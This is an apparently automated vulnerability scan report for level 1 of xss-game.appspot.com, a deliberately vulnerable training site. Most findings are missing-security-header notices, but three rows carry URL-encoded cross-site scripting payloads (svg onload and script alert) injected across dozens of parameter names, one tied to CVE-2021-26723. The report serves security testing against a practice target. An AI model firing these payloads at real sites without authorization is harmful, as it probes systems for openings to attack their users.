# Reconnaissance Report for xss-game.appspot.com/level1/frame
Generated at: 2026-01-04T08:39:12+02:00

## Summary
- **Subdomains Found**: 0
- **Live HOSTS**: 1
- **Vulnerabilities**: 16

## Vulnerability Findings

| Severity | Name | CVE | Matched At |
|----------|------|-----|------------|
| medium | Fuzzing Parameters - Cross-Site Scripting | - | https://xss-game.appspot.com/level1/frame/?activated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-activated%27%29%3E&trigger=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trigger%27%29%3E&loggedout=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-loggedout%27%29%3E&script=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-script%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-query%27%29%3E&file_name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file_name%27%29%3E&fname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-fname%27%29%3E&options=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-options%27%29%3E&export=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-export%27%29%3E&post=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-p%27%29%3E&action2=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-action2%27%29%3E&c=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-c%27%29%3E&destination=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-destination%27%29%3E |
| info | Google frontend HttpServer | - | https://xss-game.appspot.com/level1/frame |
| info | Allowed Options Method | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| info | HTTP Missing Security Headers | - | https://xss-game.appspot.com/level1/frame |
| high | Top 38 Parameters - Cross-Site Scripting | - | https://xss-game.appspot.com/level1/frame/?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E |
| medium | Jenzabar 9.2x-9.2.2 - Cross-Site Scripting | cve-2021-26723 | https://xss-game.appspot.com/level1/frame/ics?tool=search&query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E |


